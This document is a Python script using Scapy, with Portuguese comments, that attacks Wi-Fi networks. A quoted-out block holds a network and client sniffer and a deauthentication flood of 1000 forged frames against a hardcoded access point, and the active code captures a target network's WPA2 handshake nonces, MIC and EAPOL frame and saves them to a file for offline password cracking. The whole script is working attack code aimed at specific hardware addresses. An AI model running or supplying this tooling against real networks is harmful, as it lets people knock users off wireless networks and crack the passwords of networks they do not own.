"""
###########
# Monitor #
###########

from scapy.all import (
    sniff,
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    Dot11ProbeReq,
    RadioTap,
    Dot11Deauth,
    sendp,
)

sniffed_beacons = set()
clients = dict()


def beacon_handler(packet):
    if packet.haslayer(Dot11Beacon):
        ssid = packet[Dot11Elt].info.decode("utf-8", errors="ignore")
        if not ssid:
            ssid = "Oculto"

        bssid = packet[Dot11].addr3
        encryption = "OPEN"
        ie = packet[Dot11Elt]

        if (ssid, bssid) not in sniffed_beacons:
            while isinstance(ie, Dot11Elt):
                if ie.ID == 3:
                    channel = ie.info[0]
                if ie.ID == 48:
                    if b"\x00\x0f\xac\x04" in ie.info:
                        encryption = "WPA2"

                if ie.ID == 221 and ie.info.startswith(b"\x00\x50\xf2\x01"):
                    encryption = "WPA"

                ie = ie.payload.getlayer(Dot11Elt)

            sniffed_beacons.add((ssid, bssid))
            print(f"SSID: {ssid}, BSSID: {bssid}, ENCRYPTION: {encryption}, CHANNEL: {channel}")


def probe_handler(packet):
    if packet.haslayer(Dot11ProbeReq):
        ssid = packet[Dot11Elt].info.decode("utf-8", errors="ignore")

        if not ssid:
            ssid = "Oculto"

        bssid = packet[Dot11].addr3
        mac = packet[Dot11].addr2

        if (ssid, mac) not in sniffed_beacons:
            sniffed_beacons.add((ssid, mac))
            print(f"SSID: {ssid}, BSSID: {bssid}, MAC: {mac}")
            if mac not in clients:
                clients[mac] = set()
            clients[mac].add(ssid)
            print(clients[mac])


# sniff(iface="wlan0mon", prn=beacon_handler)

##########
# deauth #
##########

pkt_to_client = RadioTap() / Dot11(
    type=0,
    subtype=12,
    addr1="BA:79:C2:05:5A:DE",  # Broadcast address
    addr2="d8:36:5f:2c:7c:be",  # Your MAC address
    addr3="d8:36:5f:2c:7c:be",  # Your MAC address
) / Dot11Deauth(reason=7)

sendp(x=pkt_to_client, iface="wlan0mon", verbose=True, inter=0.01, count=1000)"""

from scapy.all import sniff, Dot11, Dot11Beacon, EAPOL, wrpcap, Dot11Elt

target_bssid = "d8:36:5f:2c:7c:be".lower()


#print("[*] Capturando handshake + contexto...")
#sniff(iface="wlan0mon", prn=handler)

import json 

target_bssid = "d8:36:5f:2c:7c:be".lower()
handshake = {}

def handshake_handler(pkt):

    if pkt.haslayer(EAPOL):
        src = pkt.addr2.lower() if pkt.addr2 else ""
        dst = pkt.addr1.lower() if pkt.addr1 else ""
        
        try:
            raw = bytes(pkt.getlayer(EAPOL))
        except:
            return

        if target_bssid not in [src, dst]:
            return

        # Message 1: AP -> Client
        if src == target_bssid and not handshake.get("ANonce"):
            handshake["AP"] = src
            handshake["Client"] = dst
            handshake["ANonce"] = raw.hex()[34:98]
            print("[1] ANonce capturado")

        # Captura SNonce apenas se vier do cliente e ANonce já foi capturado
        elif dst == target_bssid and handshake.get("ANonce") and not handshake.get("SNonce"):
            handshake["SNonce"] = raw.hex()[34:98]
            handshake["MIC"] = raw.hex()[162:194]

            eapol_zeroed = bytearray(raw)
            eapol_zeroed[81:97] = b"\x00" * 16
            handshake["EAPOL"] = eapol_zeroed.hex()

            with open("handshake_data.json", "w") as f:
                json.dump(handshake, f, indent=2)

            print("[✓] Handshake salvo com sucesso!")
            exit()

print("[*] Escutando handshake...")
sniff(iface="wlan0mon", prn=handshake_handler)
